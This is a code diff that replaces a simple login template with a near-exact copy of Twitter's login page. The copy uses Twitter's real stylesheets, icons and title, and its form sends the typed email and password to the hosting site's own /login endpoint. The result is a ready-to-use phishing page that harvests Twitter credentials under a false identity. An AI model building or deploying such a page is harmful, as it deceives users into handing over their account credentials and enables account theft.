@@ -1,34 +1,77 @@
-<%- include("header") -%>
-<div style="height:10px">
-    
-</div>    
-<div class="row">
-	<div class="col-sm-12">
-		<form class="form-horizontal" action='/login' method="POST">
-			<div class="form-group ">
-				<label class="control-label col-sm-2" for="id">Email</label>
-				<div class="col-sm-3">
-					<input type="id" class="form-control" id="email"
-						   name="email" required/>
-					<span class="error"></span>
-				</div>
-			</div>
+<!DOCTYPE html>
+<html lang="en" data-scribe-reduced-action-queue="true">
 
-			<div class="form-group">
-				<label class="control-label col-sm-2" for="id">password</label>
-				<div class="col-sm-3">
-					<input type="password" class="form-control" id="password"
-						   name="password" required/>
-					<span class="error"></span>
-				</div>
-			</div>
+<head>
+	<meta charset="utf-8">
+	<link rel="stylesheet" href="https://abs.twimg.com/a/1572376946/css/t1/twitter_core.bundle.css"
+		class="coreCSSBundles">
+	<link rel="stylesheet" class="moreCSSBundles"
+		href="https://abs.twimg.com/a/1572376946/css/t1/twitter_more_1.bundle.css">
+	<link rel="stylesheet" class="moreCSSBundles"
+		href="https://abs.twimg.com/a/1572376946/css/t1/twitter_more_2.bundle.css">
+	<link rel="dns-prefetch" href="https://pbs.twimg.com">
+	<link rel="dns-prefetch" href="https://t.co">
+	<link rel="preload" href="https://abs.twimg.com/k/en/init.en.a4f37390c5da4f3155b3.js" as="script">
+	<link rel="preload" href="https://abs.twimg.com/k/en/0.commons.en.06a750caea28350212ee.js" as="script">
+	<title>Login on Twitter</title>
+	<meta name="robots" content="NOODP">
+	<meta name="msapplication-TileImage" content="//abs.twimg.com/favicons/win8-tile-144.png" />
+	<meta name="msapplication-TileColor" content="#00aced" />
+	<link rel="mask-icon" sizes="any" href="https://abs.twimg.com/a/1572376946/icons/favicon.svg" color="#1da1f2">
+	<link rel="shortcut icon" href="//abs.twimg.com/favicons/favicon.ico" type="image/x-icon">
+	<link rel="apple-touch-icon" href="https://abs.twimg.com/icons/apple-touch-icon-192x192.png" sizes="192x192">
+	<meta name="viewport" id="viewport"
+		content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+	<meta name="swift-page-name" id="swift-page-name" content="login">
+	<meta name="swift-page-section" id="swift-section-name" content="error">
+	<link rel="canonical" href="https://twitter.com/login">
+	<link id="async-css-placeholder">
+</head>
 
-			<div class="form-group">
-				<div class="col-sm-8 col-sm-offset-2">
-					<button type="submit" class="btn btn-primary" id="submit">Proceed</button>
+<body class="three-col logged-out" data-fouc-class-names="swift-loading no-nav-banners" dir="ltr">
+	<div id="doc"
+		data-at-shortcutkeys="{&quot;Enter&quot;:&quot;Open Tweet details&quot;,&quot;o&quot;:&quot;Expand photo&quot;,&quot;/&quot;:&quot;Search&quot;,&quot;?&quot;:&quot;This menu&quot;,&quot;j&quot;:&quot;Next Tweet&quot;,&quot;k&quot;:&quot;Previous Tweet&quot;,&quot;Space&quot;:&quot;Page down&quot;,&quot;.&quot;:&quot;Load new Tweets&quot;,&quot;gu&quot;:&quot;Go to user\u2026&quot;}"
+		class="route-login login-responsive">
+		<div id="page-outer">
+			<div id="page-container" class="AppContent wrapper wrapper-login">
+
+				<div class="page-canvas">
+
+					<div class="signin-wrapper" data-login-message="false">
+						<h1>Log in to Twitter</h1>
+						<form action="/login" class="t1-form clearfix signin js-signin" method="post">
+							<fieldset>
+
+								<div class="clearfix field">
+									<input class="js-username-field email-input js-initial-focus" type="text"
+										name="email" autocomplete="on" value="" placeholder="Email">
+								</div>
+								<div class="clearfix field">
+									<input class="js-password-field" type="password" name="password"
+										placeholder="Password">
+								</div>
+							</fieldset>
+
+							<div class="captcha js-captcha">
+							</div>
+							<div class="clearfix">
+								<button type="submit"
+									class="submit EdgeButton EdgeButton--primary EdgeButtom--medium">Log in</button>
+							</div>
+
+						</form>
+					</div>
+
+					<div class="clearfix mobile has-sms">
+						<p class="signup-helper">
+							New to Twitter?
+							<a id="login-signup-link" href="/signup">Sign up now »</a>
+						</p>
+					</div>
+
 				</div>
+
 			</div>
-		</form>
+		</div>
 	</div>
-</div>
-<%- include("footer") -%>
+</body>
